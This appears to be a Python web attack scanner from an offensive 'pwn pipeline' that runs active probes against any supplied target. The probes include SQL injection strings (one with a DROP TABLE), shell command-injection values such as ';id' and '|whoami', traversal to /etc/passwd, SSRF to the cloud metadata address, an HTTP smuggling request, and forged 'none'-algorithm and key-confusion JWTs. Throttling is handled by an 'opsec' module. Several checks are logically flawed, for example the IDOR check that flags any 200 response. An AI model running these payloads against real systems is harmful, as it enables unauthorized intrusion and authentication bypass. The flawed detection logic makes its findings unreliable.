#!/usr/bin/env python3
"""
AXIOM DETECTION ENGINE — Phase 2 of Web Pwn Pipeline
Scans for vulnerabilities across all discovered endpoints.
"""

import os, sys, json, concurrent.futures, subprocess
from typing import Dict, List, Optional
from urllib.parse import urljoin

try:
    from modules import opsec
except ImportError:
    import opsec

try:
    import requests
except ImportError:
    import urllib.request, urllib.error
    class requests:
        class Session:
            def get(self, url, **kwargs):
                req = urllib.request.Request(url)
                for k, v in kwargs.get('headers', {}).items():
                    req.add_header(k, v)
                try:
                    resp = urllib.request.urlopen(req, timeout=kwargs.get('timeout', 10))
                    return type('Response', (), {
                        'status_code': resp.getcode(),
                        'text': resp.read().decode('utf-8', errors='replace'),
                        'headers': dict(resp.info())
                    })()
                except Exception as e:
                    return type('Response', (), {'status_code': 0, 'text': str(e), 'headers': {}})


class DetectionEngine:
    """Scans for web vulnerabilities."""

    # Header-probe-only checks: safe to run in every profile/mode.
    PASSIVE_CHECKS = ["cors_misconfig", "clickjacking", "security_headers"]

    VULN_CHECKS = [
        "sql_injection",
        "cross_site_scripting",
        "ssrf",
        "open_redirect",
        "idor",
        "lfi",
        "ssti",
        "command_injection",
        "smuggling",
        "graphql_introspection",
        "host_header_injection",
        "crlf_injection",
        "cache_deception",
        "jwt_none_alg",
        "jwt_alg_confusion",
        "graphql_batching",
        "prototype_pollution",
        "cors_misconfig",
        "clickjacking",
        "security_headers"
    ]

    def __init__(self, target: str, output_dir: str,
                 recon_results: Dict, aggressive: bool = False,
                 cookie: str = None, proxy: str = None, timeout: int = 10,
                 profile: "opsec.Profile" = None):
        self.target = target
        self.output_dir = output_dir
        self.recon = recon_results
        self.aggressive = aggressive
        self.cookie = cookie
        self.proxy = proxy
        self.timeout = timeout
        self.profile = profile if isinstance(profile, opsec.Profile) else opsec.DEFAULT
        self.session = opsec.http_session(self.profile, proxy=proxy, timeout=timeout)
        self.vulnerabilities = []

    def run(self) -> List[Dict]:
        """Run all vulnerability checks."""
        print("  ┌─ Detection Phase")
        if self.aggressive and not self.profile.allows_aggressive:
            print("  ├─ [!] QUIET profile — aggressive checks suppressed")
        checks = self.VULN_CHECKS if (self.aggressive and self.profile.allows_aggressive) \
            else list(dict.fromkeys(self.VULN_CHECKS[:6] + self.PASSIVE_CHECKS))
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as ex:
            futures = {ex.submit(getattr(self, f"_check_{c}")): c for c in checks}
            for f in concurrent.futures.as_completed(futures):
                name = futures[f]
                try:
                    result = f.result()
                    if result:
                        self.vulnerabilities.append(result)
                except Exception as e:
                    print(f"  ├─ [!] {name} check failed: {e}")
        self._save()
        print(f"  └─ Found {len(self.vulnerabilities)} vulnerabilities")
        return self.vulnerabilities

    def _request(self, url: str, method: str = "GET", **kwargs) -> Optional[object]:
        """Make HTTP request with error handling (opsec-throttled)."""
        headers = {}
        if self.cookie:
            headers["Cookie"] = self.cookie
        try:
            kwargs.setdefault("timeout", self.timeout)
            kwargs.setdefault("headers", headers)
            kwargs.setdefault("verify", False)
            return opsec.throttled(self.session, url, method=method,
                                   profile=self.profile, **kwargs)
        except Exception:
            return None

    def _check_sql_injection(self) -> Optional[Dict]:
        """Test for SQL injection with common payloads."""
        print("  ├─ SQL Injection scan...")
        payloads = ["'", "' OR '1'='1", "' UNION SELECT NULL--", "\"", "; DROP TABLE--"]
        indicators = ["sql", "mysql", "syntax error", "ora-", "unclosed quotation",
                       "microsoft ole db", "db error", "odbc"]
        for param in ["id", "page", "cat", "product", "user", "file", "order"]:
            for payload in payloads:
                url = f"{self.target}?{param}={payload}"
                r = self._request(url)
                if r and r.status_code in [500, 200]:
                    body = r.text.lower()
                    if any(ind in body for ind in indicators):
                        return {
                            "type": "sql_injection",
                            "url": url,
                            "param": param,
                            "payload": payload,
                            "severity": "critical",
                            "evidence": body[:200]
                        }
        return None

    def _check_cross_site_scripting(self) -> Optional[Dict]:
        """Test for reflected XSS."""
        print("  ├─ XSS scan...")
        payload = "<script>alert(1)</script>"
        test_url = f"{self.target}?q={payload}&search={payload}&s={payload}"
        r = self._request(test_url)
        if r and payload in r.text:
            return {
                "type": "cross_site_scripting",
                "url": test_url,
                "severity": "high",
                "evidence": r.text[:300]
            }
        return None

    def _check_ssrf(self) -> Optional[Dict]:
        """Test for SSRF via external callback detection."""
        print("  ├─ SSRF check...")
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:8080/",
            "http://127.0.0.1:22/",
            "http://[::1]:80/"
        ]
        for param in ["url", "path", "redirect", "file", "load", "fetch", "src"]:
            for payload in payloads:
                url = f"{self.target}?{param}={payload}"
                r = self._request(url)
                if r and r.status_code in [200, 301, 302] and (
                    "meta-data" in r.text or "localhost" in r.text or "root" in r.text):
                    return {
                        "type": "ssrf",
                        "url": url,
                        "param": param,
                        "severity": "critical",
                        "evidence": r.text[:200]
                    }
        return None

    def _check_open_redirect(self) -> Optional[Dict]:
        """Test for open redirect."""
        print("  ├─ Open redirect check...")
        test_target = "https://evil.com"
        payloads = [f"//{test_target}", f"https://{test_target}", f"http://{test_target}"]
        for param in ["next", "redirect", "url", "return", "dest", "target"]:
            for payload in payloads:
                url = f"{self.target}?{param}={payload}"
                r = self._request(url, allow_redirects=False)
                if r and r.status_code in [301, 302]:
                    loc = r.headers.get("Location", "")
                    if test_target in loc:
                        return {
                            "type": "open_redirect",
                            "url": url,
                            "severity": "medium",
                            "evidence": loc
                        }
        return None

    def _check_idor(self) -> Optional[Dict]:
        """Test for Insecure Direct Object References."""
        print("  ├─ IDOR check...")
        patterns = ["/user/", "/profile/", "/order/", "/invoice/", "/file/"]
        for pattern in patterns:
            for uid in [1001, 1002, 2001, 5000]:
                url = f"{self.target.rstrip('/')}{pattern}{uid}"
                r = self._request(url)
                if r and r.status_code == 200 and uid not in [1, 0]:
                    return {
                        "type": "idor",
                        "url": url,
                        "severity": "high",
                        "evidence": f"Accessed resource at {url} without auth"
                    }
        return None

    def _check_lfi(self) -> Optional[Dict]:
        """Test for Local File Inclusion."""
        print("  ├─ LFI check...")
        payloads = [
            "../../../etc/passwd", "../../etc/passwd", "../etc/passwd",
            "....//....//....//etc/passwd", "../../../../windows/win.ini"
        ]
        indicators = ["root:x:", "boot loader", "[fonts]", "[extensions]"]
        for payload in payloads:
            url = f"{self.target}?file={payload}&page={payload}&include={payload}"
            r = self._request(url)
            if r and any(ind in r.text for ind in indicators):
                return {
                    "type": "lfi",
                    "url": url,
                    "payload": payload,
                    "severity": "critical",
                    "evidence": r.text[:300]
                }
        return None

    def _check_ssti(self) -> Optional[Dict]:
        """Test for Server-Side Template Injection.

        Requires the evaluated result inside the canary brackets —
        a bare "49" substring in the page body is not evidence.
        """
        print("  ├─ SSTI check...")
        import uuid
        canary = uuid.uuid4().hex[:12]
        payload = f"{canary}{{{{7*7}}}}{canary}"
        url = f"{self.target}?name={payload}&user={payload}"
        r = self._request(url)
        if not r:
            return None
        if f"{canary}49{canary}" in r.text:
            return {
                "type": "ssti",
                "url": url,
                "severity": "critical",
                "evidence": f"Template expression evaluated: {canary}{{{{7*7}}}}{canary} -> {canary}49{canary}"
            }
        return None

    def _check_command_injection(self) -> Optional[Dict]:
        """Test for command injection."""
        print("  ├─ Command injection check...")
        payloads = [
            ";id", "|id", "||id", "&id&", "$(id)", "`id`",
            ";ping -c 2 127.0.0.1", "|whoami"
        ]
        indicators = ["uid=", "gid=", "groups=", "root", "nt authority"]
        for param in ["host", "ip", "domain", "server", "cmd"]:
            for payload in payloads:
                url = f"{self.target}?{param}={payload}"
                r = self._request(url)
                if r and any(ind in r.text.lower() for ind in indicators):
                    return {
                        "type": "command_injection",
                        "url": url,
                        "payload": payload,
                        "severity": "critical",
                        "evidence": r.text[:200]
                    }
        return None

    def _check_smuggling(self) -> Optional[Dict]:
        """Basic HTTP request smuggling detection."""
        print("  ├─ HTTP smuggling check...")
        try:
            import socket
            host = self.target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
            port = 443 if "https" in self.target else 80

            # TE.CL detection
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"Content-Length: 4\r\n\r\n"
                f"5c\r\nGPOST /\r\n0\r\n\r\n"
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            if "https" in self.target:
                import ssl
                sock = ssl.wrap_socket(sock)
            sock.connect((host, port))
            sock.send(payload.encode())
            resp = sock.recv(4096).decode('utf-8', errors='replace')
            sock.close()

            if "GPOST" in resp or "unrecognized" in resp.lower():
                return {
                    "type": "http_smuggling",
                    "severity": "critical",
                    "evidence": "TE.CL smuggling detected"
                }
        except:
            pass
        return None

    def _check_graphql_introspection(self) -> Optional[Dict]:
        """Check if GraphQL introspection is enabled."""
        print("  ├─ GraphQL introspection check...")
        query = '{"query":"{ __schema { types { name } } }"}'
        endpoints = ["/graphql", "/v1/graphql", "/api/graphql", "/graph", "/query"]
        for ep in endpoints:
            url = f"{self.target.rstrip('/')}{ep}"
            r = self._request(url, method="POST", data=query,
                              headers={"Content-Type": "application/json"})
            if r and "data" in r.text and "__schema" in r.text:
                return {
                    "type": "graphql_introspection",
                    "url": url,
                    "severity": "high",
                    "evidence": "GraphQL introspection enabled"
                }
        return None

    def _check_host_header_injection(self) -> Optional[Dict]:
        """Test for password-reset/cache poisoning via Host header manipulation."""
        print("  ├─ Host header injection check...")
        attacker_host = "evil-host-header.com"
        probes = [
            {"Host": attacker_host},
            {"X-Forwarded-Host": attacker_host},
            {"X-Forwarded-Host": f"{attacker_host}", "X-Forwarded-Proto": "https"},
        ]
        try:
            baseline = self._request(self.target, allow_redirects=False)
            baseline_body = baseline.text if baseline else ""
        except Exception:
            baseline_body = ""
        for probe in probes:
            r = self._request(self.target, allow_redirects=False, headers=probe)
            if not r:
                continue
            reflected = attacker_host in r.text and attacker_host not in baseline_body
            location = r.headers.get("Location", "")
            location_reflect = attacker_host in location
            if reflected or location_reflect:
                return {
                    "type": "host_header_injection",
                    "url": self.target,
                    "severity": "high",
                    "evidence": f"Attacker host reflected ({'Location' if location_reflect else 'body'}) "
                                f"using {list(probe)[0]}"
                }
        return None

    def _check_crlf_injection(self) -> Optional[Dict]:
        """Test for response splitting / header injection via CRLF in path."""
        print("  ├─ CRLF injection check...")
        canary = "injectedcrlf"
        payloads = [
            f"%0d%0aSet-Cookie:{canary}=1",
            f"%0d%0a%0d%0a<html>{canary}",
            f"%%0d%0a%%0d%0aSet-Cookie:{canary}=1",
        ]
        for payload in payloads:
            url = f"{self.target.rstrip('/')}/{payload}"
            r = self._request(url, allow_redirects=False)
            if not r:
                continue
            header_hit = any(canary in str(v) for v in r.headers.values())
            if header_hit:
                return {
                    "type": "crlf_injection",
                    "url": url,
                    "severity": "high",
                    "evidence": f"Injected Set-Cookie:{canary}=1 accepted into response headers"
                }
        return None

    def _check_cache_deception(self) -> Optional[Dict]:
        """Test for web cache deception: dynamic content on static-looking path."""
        print("  ├─ Cache deception check...")
        try:
            baseline = self._request(self.target, allow_redirects=False)
            if not baseline or baseline.status_code >= 400:
                return None
            dynamic_len = len(baseline.text)
        except Exception:
            return None
        extensions = [".css", ".js", "/style.css", "/app.js", ";.css"]
        path = self.target.rstrip("/")
        for ext in extensions:
            url = f"{path}{ext}"
            r = self._request(url, allow_redirects=False)
            if r and r.status_code == 200 and abs(len(r.text) - dynamic_len) < 512 and len(r.text) > 0:
                return {
                    "type": "cache_deception",
                    "url": url,
                    "severity": "high",
                    "evidence": f"Dynamic page body ({len(r.text)} bytes ~ baseline {dynamic_len}) "
                                f"served on static-looking path '{ext}'"
                }
        return None

    @staticmethod
    def _b64url_decode(segment: str) -> bytes:
        import base64
        padding = "=" * (-len(segment) % 4)
        return base64.urlsafe_b64decode(segment + padding)

    def _find_jwt(self) -> Optional[str]:
        """Locate a JWT: from session cookie or the page body."""
        import re
        if self.cookie:
            match = re.search(r"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)", self.cookie)
            if match:
                return match.group(1)
        try:
            r = self._request(self.target)
            if r:
                match = re.search(r"(eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)", r.text)
                if match:
                    return match.group(1)
        except Exception:
            pass
        return None

    def _check_jwt_none_alg(self) -> Optional[Dict]:
        """Test for JWT 'none' algorithm acceptance: forge unsigned token."""
        print("  ├─ JWT none-alg check...")
        jwt = self._find_jwt()
        if not jwt:
            return None
        try:
            header = json.loads(self._b64url_decode(jwt.split(".")[0]))
            payload = json.loads(self._b64url_decode(jwt.split(".")[1]))
        except Exception:
            return None
        forged_header = dict(header)
        forged_header["alg"] = "none"
        import base64
        def b64url(data: bytes) -> str:
            return base64.urlsafe_b64encode(data).decode().rstrip("=")
        token = f"{b64url(json.dumps(forged_header).encode())}.{b64url(json.dumps(payload).encode())}."
        url = self.target.rstrip("/")
        r = self._request(url, headers={"Authorization": f"Bearer {token}",
                                        "Cookie": f"token={token}" + (f"; {self.cookie}" if self.cookie else "")})
        if r and r.status_code == 200:
            baseline = self._request(url)
            baseline_status = baseline.status_code if baseline else 401
            if baseline_status in (401, 403) or baseline_status != r.status_code:
                return {
                    "type": "jwt_none_alg",
                    "url": url,
                    "severity": "critical",
                    "evidence": f"Unsigned 'none' alg token accepted (orig alg {header.get('alg')}, "
                                f"status {baseline_status} -> {r.status_code})"
                }
        return None

    def _check_jwt_alg_confusion(self) -> Optional[Dict]:
        """Test for RS256->HS256 confusion: sign with the public key as HMAC secret."""
        print("  ├─ JWT alg confusion check...")
        jwt = self._find_jwt()
        if not jwt:
            return None
        import base64, hmac, hashlib, re as _re
        def b64url(data: bytes) -> str:
            return base64.urlsafe_b64encode(data).decode().rstrip("=")
        try:
            header = json.loads(self._b64url_decode(jwt.split(".")[0]))
            payload = json.loads(self._b64url_decode(jwt.split(".")[1]))
        except Exception:
            return None
        if header.get("alg") not in ("RS256", "ES256"):
            return None
        public_key = None
        for path in ("/.well-known/jwks.json", "/public.pem", "/jwks.json", "/publicKey"):
            url = f"{self.target.rstrip('/')}{path}"
            r = self._request(url)
            if r and r.status_code == 200 and r.text:
                public_key = r.text[:512]
                break
        if not public_key:
            return None
        confused_header = dict(header)
        confused_header["alg"] = "HS256"
        signing_input = (b64url(json.dumps(confused_header).encode()) + "." +
                         b64url(json.dumps(payload).encode())).encode()
        signature = b64url(hmac.new(public_key.encode(), signing_input, hashlib.sha256).digest())
        token = signing_input.decode() + "." + signature
        url = self.target.rstrip("/")
        r = self._request(url, headers={"Authorization": f"Bearer {token}",
                                        "Cookie": f"token={token}" + (f"; {self.cookie}" if self.cookie else "")})
        if r and r.status_code == 200:
            baseline = self._request(url)
            baseline_status = baseline.status_code if baseline else 401
            if baseline_status in (401, 403) or baseline_status != r.status_code:
                return {
                    "type": "jwt_alg_confusion",
                    "url": url,
                    "severity": "critical",
                    "evidence": f"HS256 token signed with fetched public key accepted "
                                f"(orig alg {header.get('alg')}, status {baseline_status} -> {r.status_code})"
                }
        return None

    def _check_graphql_batching(self) -> Optional[Dict]:
        """Test for GraphQL query batching (array-of-queries accepted)."""
        print("  ├─ GraphQL batching check...")
        endpoints = ["/graphql", "/v1/graphql", "/api/graphql", "/graph", "/query"]
        batch = json.dumps([
            {"query": "query { __typename }"},
            {"query": "query { __typename }"}
        ])
        for ep in endpoints:
            url = f"{self.target.rstrip('/')}{ep}"
            r = self._request(url, method="POST", data=batch,
                              headers={"Content-Type": "application/json"})
            if not r:
                continue
            try:
                parsed = json.loads(r.text)
            except Exception:
                continue
            if isinstance(parsed, list) and len(parsed) == 2:
                return {
                    "type": "graphql_batching",
                    "url": url,
                    "severity": "high",
                    "evidence": "Batched array of 2 queries both executed (DoS/bypass surface)"
                }
        return None

    def _check_prototype_pollution(self) -> Optional[Dict]:
        """Test for server/client prototype pollution via __proto__ params."""
        print("  ├─ Prototype pollution check...")
        canary = "pollutedcanary"
        payloads = [
            f"?__proto__[env]={canary}",
            f"?__proto__%5Benv%5D={canary}",
            f"?constructor[prototype][env]={canary}",
            f"?__proto__%5Bpollutedcanary%5D=x",
        ]
        for payload in payloads:
            url = f"{self.target}{payload}"
            r = self._request(url)
            if r and canary in r.text:
                return {
                    "type": "prototype_pollution",
                    "url": url,
                    "severity": "high",
                    "evidence": f"Canary '{canary}' merged into rendered config/env after __proto__ injection"
                }
        return None

    def _check_cors_misconfig(self) -> Optional[Dict]:
        """Test for reflected-origin CORS with credentials (header probe only)."""
        print("  ├─ CORS misconfiguration check...")
        evil = "https://evil-origin-check.com"
        r = self._request(self.target, headers={"Origin": evil})
        if not r:
            return None
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "")
        if acao == evil or (acao == "*" and not acac):
            if acao == evil:
                return {
                    "type": "cors_misconfig",
                    "url": self.target,
                    "severity": "high",
                    "evidence": f"Origin {evil} reflected with "
                                f"Access-Control-Allow-Credentials={acac or 'absent'}"
                }
        return None

    def _check_clickjacking(self) -> Optional[Dict]:
        """Passive: missing X-Frame-Options / frame-ancestors (header probe only)."""
        print("  ├─ Clickjacking check...")
        r = self._request(self.target)
        if not r:
            return None
        xfo = r.headers.get("X-Frame-Options", "")
        csp = r.headers.get("Content-Security-Policy", "")
        if not xfo and "frame-ancestors" not in csp:
            return {
                "type": "clickjacking",
                "url": self.target,
                "severity": "low",
                "evidence": "No X-Frame-Options and no frame-ancestors — page is framable"
            }
        return None

    def _check_security_headers(self) -> Optional[Dict]:
        """Passive: missing baseline security headers (header probe only)."""
        print("  ├─ Security headers check...")
        r = self._request(self.target)
        if not r:
            return None
        required = [
            "Content-Security-Policy",
            "Strict-Transport-Security",
            "X-Content-Type-Options",
            "Referrer-Policy",
            "Permissions-Policy",
        ]
        missing = [h for h in required if h not in r.headers]
        if len(missing) >= 3:
            return {
                "type": "security_headers",
                "url": self.target,
                "severity": "low",
                "evidence": f"Missing {len(missing)}/{len(required)} baseline headers: {', '.join(missing)}"
            }
        return None

    def _save(self):
        path = f"{self.output_dir}/vulnerabilities.json"
        with open(path, "w") as f:
            json.dump(self.vulnerabilities, f, indent=2, default=str)
        print(f"  ├─ Saved: {path}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="AXIOM Detection Engine")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-o", "--output", default=".")
    args = parser.parse_args()
    engine = DetectionEngine(args.target, args.output, {})
    engine.run()
